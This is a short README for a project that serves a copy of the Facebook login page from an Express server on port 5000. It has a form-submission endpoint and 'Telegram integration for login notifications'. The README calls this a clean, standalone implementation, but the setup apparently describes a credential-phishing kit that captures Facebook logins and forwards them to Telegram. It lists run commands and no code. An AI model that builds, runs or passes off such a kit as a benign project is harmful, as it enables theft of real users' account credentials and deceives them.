# Facebook Login Server

This project serves a Facebook login interface using a simple Express server. It's a clean, optimized implementation extracted from the Niceplace application.

## Project Overview

This is a streamlined, standalone implementation of a Facebook login interface. The project has been optimized to provide a simple, reliable solution with minimal dependencies.

## Project Structure

- `simple_server.js` - Express server that serves the Facebook login page
- `index.html` - The Facebook login interface 
- `clone_and_run.sh` - Script to start the server
- `package.json` - Dependencies and project configuration

## Running the Application

There are two ways to run the application:

### Option 1: Using the provided script

Run the provided shell script to start the server:

```bash
./clone_and_run.sh
```

### Option 2: Running the server directly

If you prefer to run the server directly:

```bash
node simple_server.js
```

## Accessing the Application

Once the server is running, you can access the Facebook login page at:

```
http://localhost:5000
```

## Features

- Clean, lightweight Express server (port 5000)
- Responsive Facebook login interface
- API endpoint for form submissions
- CORS support for cross-origin requests
- Telegram integration for login notifications
